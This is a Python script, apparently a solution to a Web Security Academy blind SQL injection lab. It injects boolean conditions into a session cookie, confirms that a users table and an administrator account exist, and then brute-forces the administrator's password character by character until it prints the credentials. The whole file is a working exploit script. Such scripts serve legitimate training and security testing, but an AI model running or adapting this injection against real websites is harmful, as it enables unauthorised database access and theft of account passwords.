from bs4 import BeautifulSoup
import requests

# LAB11 Blind SQLi
# Author: AFANX
# 09/08/2024

def info(msg):
    print("[!] " + str(msg))

def error(msg):
    print("[-] " + str(msg))

def success(msg):
    print("[+] " + str(msg))

def send(payload, cookie=None):
    info(payload)
    if(cookie is None):
        response = requests.get(payload)
        info(response.status_code)
        return response
    else:
        cookies = {}
        cookies[cookie.split(":")[0]] = cookie.split(":")[1]
        response = requests.get(payload, cookies=cookies)
        info(response.status_code)
        return response
    
def recv_cookies(url, domain):
    info(url)
    response = requests.get(url)
    cookie_dict = response.cookies.get_dict(domain=domain)
    found = ['%s=%s' % (name, value) for (name, value) in cookie_dict.items()]
    return ':'.join(found[0].split("="))

def url_encode(str_payload):
    url_encode_result = "+"
    for i in str_payload.split(" "):
        url_encode_result += i + '+'
    return url_encode_result[:len(url_encode_result)-1]

def main():
    url = "https://0a0900a303625b51839c412c002e00f9.web-security-academy.net/"

    cookies = recv_cookies(url, "0a0900a303625b51839c412c002e00f9.web-security-academy.net")
    info("COOKIES: " + cookies)

    # step 0 -> check blind sqli
    payload = cookies + "' and '1'='1"
    response = send(url, payload)
    soup = BeautifulSoup(response.text, "html.parser")
    
    for i in soup.find_all('div'):
        if('Welcome back!' in i.text):
            success("Blind SQLi")
            break
    
    # step 1 -> check table users; check if there is a letter a in the users table
    payload = cookies + "' and (select 'a' from users)='a"
    response = send(url, payload)
    soup = BeautifulSoup(response.text, "html.parser")
    
    for i in soup.find_all('div'):
        if('Welcome back!' in i.text):
            success("check table")
            break

    # step 2 -> check if there is a user administrator
    payload = cookies + "' and (select 'a' from users where username = 'administrator')='a"
    response = send(url, payload)
    soup = BeautifulSoup(response.text, "html.parser")
    
    for i in soup.find_all('div'):
        if('Welcome back!' in i.text):
            success("check administrator")
            break

    # step 3 -> identify the length of the password
    payload = cookies + "' and (select 'a' from users where username = 'administrator' and length(password)=20)='a"
    response = send(url, payload)
    soup = BeautifulSoup(response.text, "html.parser")
    
    for i in soup.find_all('div'):
        if('Welcome back!' in i.text):
            success("identify the lenght")
            break

    # step 4 -> bruteforce password
    wordlist = ['0','1','2','3','4','5','6','7','8','9', 'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
    count = 1
    flag = 0
    password = ""

    while(count != 21):
        for k in wordlist:
            payload = cookies + "' and (select substring(password," + str(count) + ",1) from users where username = 'administrator')='" + k
            response = send(url, payload)
            info(payload)
            soup = BeautifulSoup(response.text, "html.parser")
            
            for i in soup.find_all('header'):
                for j in i.find_all('div'):
                    if('Welcome back' in i.text):
                        password += k
                        flag = 1
                        success("PASSWORD: " + password)
                        break 
            if(flag == 1):
                flag = 0
                count += 1
                break

    success("administrator:" + password)

if __name__ == "__main__":
    main()